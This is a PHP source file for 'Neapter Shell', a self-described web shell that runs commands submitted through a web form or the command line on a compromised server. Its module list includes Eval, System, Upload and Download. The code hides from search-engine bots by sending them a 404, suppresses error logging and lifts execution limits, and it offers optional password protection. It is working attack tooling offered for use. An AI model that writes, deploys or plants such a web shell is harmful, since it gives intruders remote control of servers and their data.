<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Required modules:
 * - Autoload
 * - Cat
 * - Cd
 * - Chmod
 * - Cp
 * - Cr3d1ts
 * - Download
 * - Echo
 * - Edit
 * - Eval
 * - Help
 * - Id
 * - Info
 * - Logout
 * - Ls
 * - Mkdir
 * - Modules
 * - Mv
 * - Phpinfo
 * - Ping
 * - Pwd
 * - Remove
 * - System
 * - Upload
 * - Version
 */

require_once dirname(__FILE__) . '/Arr.php';
require_once dirname(__FILE__) . '/Request.php';
require_once dirname(__FILE__) . '/ModuleAbstract.php';
require_once dirname(__FILE__) . '/LoadModules.php';
require_once dirname(__FILE__) . '/XRecursiveDirectoryIterator.php';
require_once dirname(__FILE__) . '/Args.php';
require_once dirname(__FILE__) . '/Utils.php';

/**
 * NeapterSHell - WebShell, PHP Server manager
 *
 * @category  WebShell
 * @package   NeapterShell
 * @version   1.0.0-dev
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 * @link    http://www.php.net/manual/en/class.recursivedirectoryiterator.php#101654
 */
class Shell
{
    /**
     * Wersja
     */
    const VERSION = '1.0.0-dev';

    /**
     * Dane do uwierzytelniania, jezeli wartosc jest rowna null, to shell nie jest chroniony haslem
     *
     * format: sha1( $sUser . "\xff" . $sPass );
     *
     * @var string
     */
    protected $sAuth;

    /**
     * Czas generowania strony
     *
     * @var float
     */
    protected $fGeneratedIn;

    /**
     * Nazwa polecenie
     * ':test' => 'test'
     *
     * @var string
     */
    protected $sCmd;

    /**
     * Parsowanie argumentow
     *
     * @var object
     */
    protected $oArgs;

    /**
     * Zestaw narzędzie
     *
     * @var object
     */
    protected $oUtils;

    /**
     * Jezeli true to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
     *
     * @var boolean
     */
    protected $bDev = false;

    /**
     * Jezeli false to skrypty JavaScript sa wlaczone
     *
     * @var boolean
     */
    protected $bNoJs = false;

    /**
     * Konstruktor
     *
     * @param string $sArgs Arguments to execute commands
     */
    public function __construct($sArgs = null)
    {
        /**
         * Czas generowania strony a w zasadzie shella
         */
        $this->fGeneratedIn = microtime(1);

        $this->sArgs = $sArgs;

        $this->oUtils = new Utils();
        $this->oArgs = new Args($this->sArgs);

        $this->loadConfig();

        /**
         * Uwierzytelnianie
         *
         * @see self::$sAuth
         */
        if (defined('NF_AUTH') && preg_match('~^[a-f0-9]{40}\z~', NF_AUTH)) {
            $this->sAuth = NF_AUTH;
        }

        /**
         * @see Request::init
         *
         * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
         *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
         * tylko
         *   ( Request::getGet( 'test' ) === 'test' )
         */
        Request::init();

        /**
         * Blokowanie google bota; baidu, bing, yahoo moga byc
         */
        if ($this->oUtils->isUserAgentOnBlacklist(Request::getServer('HTTP_USER_AGENT'))) {
            header('HTTP/1.0 404 Not Found');
            exit;
        }

        /**
         * Uruchomienie shella z domyslna konfiguracja - bez wczytywania ustawien
         * bez rozszerzen i modulow
         */
        if (!(isset($_GET['skip_modules']) || isset($_SERVER['skip_modules']))) {
            $this->oUtils->loadModules();
            $this->oUtils->autoloadExtensions();
        }

        if ($sDir = $this->oUtils->cacheGet('chdir')) {
            @ chdir($sDir);
        }
    }

    public function eof()
    {
        /* @todo */
        // exit;
    }

    protected function loadConfig()
    {
        setlocale(LC_ALL, 'polish.UTF-8');

        if (PHP_SAPI !== 'cli') {
            header('Content-type: text/html; charset=utf-8');
        }

        ini_set('default_charset', 'utf-8');
        ini_set('default_mimetype', 'text/html');

        $this->bDev = isset($_GET['dev']) || isset($_SERVER['dev']);
        $this->bNoJs = isset($_GET['nojs']);

        ignore_user_abort(0);
        ini_set('default_socket_timeout', 15);

        if (!$this->oUtils->isSafeMode()) {
            ini_set('max_execution_time', 0);
            ini_set('memory_limit', '1024M');
            ini_set('default_socket_timeout', 15);
            ini_set('date.timezone', 'Europe/Warsaw');
            ini_set('html_errors', 0);
            ini_set('error_log', null);
        } else {
            date_default_timezone_set('Europe/Warsaw');
        }

        /* Development version */
        ini_set('display_errors', (int) $this->bDev);
        error_reporting($this->bDev ? -1 : 0);

        ini_set('log_errors_max_len', $this->bDev ? 1024 : 1);
        ini_set('log_errors', (int) !$this->bDev);

        /* Disable opcache extension if is loaded and enabled
           We create a lot of temporary files. We have to turn off
           revalidate_path, revalidate_freq, validate_timestamps, use_cwd etc.
        */
        if (function_exists('opcache_get_status')
            && ini_get('opcache.enable')
        ) {
            ini_set('opcache.enable', 0);
        }
    }

    protected function auth()
    {
        $sKey = $this->oUtils->getAuthFileKey();

        $sAuth = $this->oUtils->cacheGet($this->oUtils->getAuthFileKey());

        $sPassword = sha1($this->sAuth . Request::getServer('REMOTE_ADDR'), true);

        if ($sAuth !== $sPassword) {
            /**
             * Sprawdzanie poprawnosci sha1( "user\xffpass" );
             */
            if ($this->sAuth !== sha1(Request::getPost('user') . "\xff" . Request::getPost('pass'))) {
                $this->bNoJs = true;

                $sContent = sprintf(
                    '<form action="%s" method="post">' .
                    '<input type="text" name="user"/><input type="password" name="pass"/>' .
                    '<input type="submit" name="submit" value="Go !"/></form>',
                    Request::getCurrentUrl()
                );

                echo $this->getContent($sContent, false);
                exit;
            }

            $this->oUtils->cacheSet($sKey, $sPassword);
        }
    }

    /**
     * Pobieranie statusu TAK / NIE
     *
     * @param  boolean $bValue    Wartosc
     * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
     * @return string             Status
     */
    private function getStatus($bValue, $bNegative = false)
    {
        return sprintf(
            '<span class="%s">%s</span>',
            (($bNegative ? !$bValue : $bValue) ? 'green' : 'red'),
            ($bValue ? 'TAK' : 'NIE')
        );
    }

    /**
     * Pobieranie menu
     *
     * @return string  Menu w HTMLu
     */
    private function getMenu()
    {
        return sprintf(
            'Wersja PHP: <strong>%s</strong><br/>' .
            'SafeMode: %s<br/>' .
            'OpenBaseDir: <strong>%s</strong><br/>' .
            'Serwer Api: <strong>%s</strong><br/>' .
            'Serwer: <strong>%s</strong><br/>' .
            'TMP: <strong>%s</strong><br/>' .
            'Zablokowane funkcje: <strong>%s</strong><br/>',
            phpversion(),
            $this->getStatus($this->oUtils->isSafeMode(), true),
            ((($sBasedir = ini_get('open_basedir')) === '') ? $this->getStatus(0, true) : $sBasedir),
            php_sapi_name(),
            php_uname(),
            $this->oUtils->getTmpDir(),
            (($sDisFunc = implode(',', $this->oUtils->getDisabledFunctions()) === '') ? 'Brak' : $sDisFunc)
        );
    }

    /**
     * Domyslna akcja, dostep do konsoli
     *
     * @param string $sCmd Command to execute
     *
     * @return string
     */
    public function getCommandOutput($sCmd = null)
    {
        $bRaw = ($sCmd !== null);

        /**
         * Zawartosc konsoli
         */
        $sConsole = null;

        /**
         * Domyslna komenda to :ls -l sciezka_do_katalogu
         */
        if ($sCmd === null) {
            if (PHP_SAPI === 'cli') {
                /**
                 * Zmienne globalne to zlo ;), to powinno zostac przekazane
                 * jako parametr w konstruktorze ... ale coz ...
                 */
                $aArgv = $GLOBALS['argv'];
                array_shift($aArgv);

                $sCmd = implode($aArgv, ' ');
            } elseif (Request::getPost('cmd') === false) {
                $sCmd = ':ls -l ' . dirname(Request::getServer('SCRIPT_FILENAME'));
            } else {
                $sCmd = (string) Request::getPost('cmd');
            }
        }
        /**
         * Komendy shella rozpoczynaja sie od znaku ':'
         */
        if (substr($sCmd, 0, 1) === ':') {
            if (($iPos = strpos($sCmd, ' ') - 1) !== -1) {
                $this->sCmd = substr($sCmd, 1, $iPos);
            } else {
                $this->sCmd = (string) substr($sCmd, 1);
            }

            $this->oArgs = new Args(ltrim(preg_replace(sprintf('~^\:%s[\s+]?~', $this->sCmd), null, $sCmd)));

            $aModules = $this->oUtils->getCommands();

            /**
             *  Lista komend i aliasy
             */
            if ($aModules === array()) {
                $sConsole = 'Nie wczytano żadnych modułów !!!';
            } elseif (isset($aModules[$this->sCmd])) {
                $sModule = $aModules[$this->sCmd];
                $oModule = new $sModule($this, $this->oUtils, $this->oArgs);

                if (($this->oArgs->getNumberOfParams() === 1)
                    && ($this->oArgs->getParam(0) === 'help')
                ) {
                    $sConsole = $sModule::getHelp();

                    //$sConsole = implode(', ', $this->oUtils->getCommandsByModule($sModule)) . ' - ' . $sHelp;
                } else {
                    $sConsole = $oModule->get();
                }
            } else {
                $sConsole = sprintf('Nie ma takiego polecenia "%s"', htmlspecialchars($this->sCmd));
            }
        } elseif ($sCmd === '') {
            $sConsole = 'Wpisz ":help", by zobaczyć pomoc';
            /* Execute system command */
        } elseif (class_exists('ModuleSystem')) {
            $this->oArgs = new Args(preg_replace('~^:[^ ]+\s+~', '', $sCmd));
            $oSystem = new ModuleSystem($this, $this->oUtils, $this->oArgs);

            $sConsole = $oSystem->get();
        }

        if ($bRaw || (PHP_SAPI === 'cli')) {
            return htmlspecialchars_decode($sConsole) . "\r\n";
        }

        $sContent = sprintf(
            '<pre id="console">%s</pre><br/>' .
            '<form action="%s" method="post">' .
            '<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="on"/>' .
            '<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
            $sConsole,
            Request::getCurrentUrl(),
            htmlspecialchars(((($sVal = Request::getPost('cmd')) !== false) ? $sVal : (string) $sCmd))
        );

        return $this->getContent($sContent);
    }

    /**
     * Pobieranie calosci strony
     *
     * @param  string  $sData         Zawartosc strony
     * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
     * @return string
     */
    private function getContent($sData, $bExdendedInfo = true)
    {
        if (Request::isAjax()) {
            preg_match('~<pre id="console">(.*)</pre>~s', $sData, $aMatch);

            if ($aMatch === array()) {
                return 'Występił nieznany błąd';
            }

            return $aMatch[1];
        }

        $sScript = null;
        if (!$this->bNoJs) {
            $sScript = '<script src="?js"></script>';
        }

        $sMenu = $this->getMenu();
        $sGeneratedIn = sprintf('%.5f', microtime(1) - $this->fGeneratedIn);
        $sTitle = sprintf('NeapterShell @ %s (%s)', Request::getServer('HTTP_HOST'), Request::getServer('SERVER_ADDR'));
        $sVersion = self::VERSION;
        return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title>" .
            "<meta charset=\"utf-8\"><link href=\"?css\" type=\"text/css\" media=\"all\" rel=\"stylesheet\"/>" .
            "</head><body><div id=\"body\">" .
            ($bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : '') .
            "<div id=\"content\">{$sData}</div></div>" .
            ($bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | " .
                "Wersja: <strong>{$sVersion}</strong></div>" : '') .
            "</div>{$sScript}</body></html>";
    }

    protected function getHttpCacheHeaders()
    {
        header('Expires: '. date('D, d M Y H:i:s \G\M\T', time() + (3600*24*365)));
    }

    protected function getJs()
    {
        header('Content-type: application/javascript');
        $this->getHttpCacheHeaders();

        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Lib/js.js');
        exit;
    }

    protected function getCss()
    {
        header('Content-type: text/css');
        $this->getHttpCacheHeaders();

        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Styles/haxior.css');
        exit;
    }

    /**
     * Wyswietlanie strony
     *
     * @return void
     */
    public function get()
    {
        if (isset($_GET['js'])) {
            $this->getJs();
        }

        if (isset($_GET['css'])) {
            $this->getCss();
        }

        if ((PHP_SAPI !== 'cli') && ($this->sAuth !== null)) {
            $this->auth();
        }

        /**
         * CLI
         */
        if (PHP_SAPI === 'cli') {
            print("\r\n");
            print("   .  .          ,          __..     ..\r\n");
            print("   |\\ | _  _.._ -+- _ ._.  (__ |_  _ ||\r\n");
            print("   | \\|(/,(_][_) | (/,[    .__)[ )(/,||\r\n");
            printf("             |          v%s\r\n\r\n", self::VERSION);

            if (count($GLOBALS['argv']) === 1) {
                for (;;) {
                    printf('>> ns@127.0.0.1:%s$ ', getcwd());
                    echo $this->getCommandOutput(rtrim(fgets(STDIN)));
                }
                return;
            }
        }

        /**
         * Strasznie duzo jest kodu, wygodniej jest rozdzielic
         * to na inne metody
         */
        echo $this->getCommandOutput();
    }

    /**
     * Get Args object
     *
     * @return Args
     */
    public function getArgs()
    {
        return $this->oArgs;
    }

    /**
     * Get Utils object
     *
     * @return Utils
     */
    public function getUtils()
    {
        return $this->oUtils;
    }

    /**
     * Set developer mode ON or OFF
     *
     * @param  boolean $bValue On or off
     * @return void
     */
    protected function setDev($bValue)
    {
        $this->bDev = (bool) $bValue;
        $this->loadDevConfig();
    }
}
